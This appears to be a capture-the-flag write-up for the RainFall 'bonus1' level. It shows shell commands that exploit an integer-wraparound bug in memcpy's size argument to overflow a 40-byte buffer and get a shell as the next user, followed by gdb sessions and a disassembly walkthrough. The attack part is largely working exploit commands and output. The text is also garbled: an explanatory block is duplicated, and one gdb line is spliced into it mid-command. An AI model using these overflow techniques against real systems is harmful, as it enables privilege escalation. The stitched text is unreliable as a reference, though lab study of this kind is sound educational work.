BONUS_1:
# 📚 Exploiting bonus1
```bash
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c 'print "A"*56 + "\x82\x84\x04\x08"')
$ whoami
bonus2
$ exit
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ exit
bonus1@RainFall:~$ ./bonus1 -2147483637 `python -c "print 'a' * 40 + '\x46''\x4c''\x4f''\x57'"`
$ whoami
bonus2
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "B"*40 + "FLOW"')
$ exit
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "B"*40 + "FLOW"')
$ exit
```


so 9 (the max number that we can try with it) is not enough for overflow.

- We know that memcpy uses size_t (unsigned_int), so we can try with a negative number because it will be interpreted as a positive number whatever happens. So if we exceed the limit of the unsigned_int max we will back to 0.

MAX of unsigned_int = 4294967295

4294967295 / 4 + 1 = 1073741824

- We will break at memcpy and examine our variable.

(gdb) b *0x08048473
Breakpoint 1 at 0x8048473
(gdb) r -1073741824 AAAAAAAAAAAA
Starting program: /home/user/bonus1/bonus1 -1073741824 AAAAAAAAAAAA

Breakpoint 1, 0x08048473 in main ()
(gdb) x/x $esp+0x8
0xbffff278:	0x00000000

- So now we have 0 as a value. now we will try to set 100 as a value.

1073741824 - 25 = 1073741799

(gdb) r -1073741799 AAAAAAAAAAAA
Starting program: /home/user/bonus1/bonus1 -1073741799 AAAAAAAAAAAA

Breakpoint 1, 0x08048473 in main ()
(gdb) x/x $esp+0x8
0xbffff278:	0x00000064 // = 100

- Now we need to find the offset which we can overflow. for that, we will set a breakpoint after memcpy and examine our value.

Starting program: /home/user/bonus1/bonus1 -1073741799 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 2, 0x08048478 in main ()
(gdb) x/x $esp+0x3c
0xbffff25c:	0x62413362

- And we found that offset is 40. so now we need just to write this value (0x574f4c46) after the 40 chars.

40 + 4 = 44 / 4 = 11
1073741824 - 11 = 1073741813

nb = (L/4) - 2^30 

From the disassembly

At 0x0804842a: sub $0x40, %esp → reserves 64 bytes local space.

At 0x0804843d: mov %eax, 0x3c(%esp) → nb is stored at [esp+0x3c].

At 0x08048464: lea 0x14(%esp), %eax → buffer starts at [esp+0x14].

So:

esp+0x14 → buffer[0]
...
esp+0x3b → buffer[39]
esp+0x3c → nb (the integer)


That means nb sits right after 40 bytes of buffer. Classic overflow pattern.

📍 In gdb: how to see them

You already set a breakpoint at 0x08048478 (just after memcpy).
Now you can inspect:

(gdb) run -1073741813 $(python -c "print 'B'*40 + 'FLOW'")


When it stops at breakpoint:

See esp

(gdb) From the disassembly

At 0x0804842a: sub $0x40, %esp → reserves 64 bytes local space.

At 0x0804843d: mov %eax, 0x3c(%esp) → nb is stored at [esp+0x3c].

At 0x08048464: lea 0x14(%esp), %eax → buffer starts at [esp+0x14].

So:

esp+0x14 → buffer[0]
...
esp+0x3b → buffer[39]
esp+0x3c → nb (the integer)


That means nb sits right after 40 bytes of buffer. Classic overflow pattern.

📍 In gdb: how to see them

You already set a breakpoint at 0x08048478 (just after memcpy).
Now you can inspect:

(gdb) run -1073741813 $(python -c "print 'B'*40 + 'FLOW'")


When it stops at breakpoint:

See esp

(gdb) p/x $esp ==> $1 = 0xbffff6b0


Dump buffer region

(gdb) x/48bx $esp+0x14


This shows the 40 Bs followed by "FLOW", because memcpy just copied nb*4 bytes from argv[2] into buffer.

See nb (the integer)

(gdb) x/wx $esp+0x3c


Compare addresses

(gdb) p/x $esp+0x14       # buffer start
(gdb) p/x $esp+0x3c       # nb location
(gdb) p/d ($esp+0x3c) - ($esp+0x14)


You should see a difference of 0x28 = 40 bytes.
That’s exactly why "B"*40 + "FLOW" overwrites nb.


Dump buffer region

(gdb) x/48bx $esp+0x14


This shows the 40 Bs followed by "FLOW", because memcpy just copied nb*4 bytes from argv[2] into buffer.

See nb (the integer)

(gdb) x/wx $esp+0x3c


Compare addresses

(gdb) p/x $esp+0x14       # buffer start
(gdb) p/x $esp+0x3c       # nb location
(gdb) p/d ($esp+0x3c) - ($esp+0x14)


You should see a difference of 0x28 = 40 bytes.
That’s exactly why "B"*40 + "FLOW" overwrites nb.
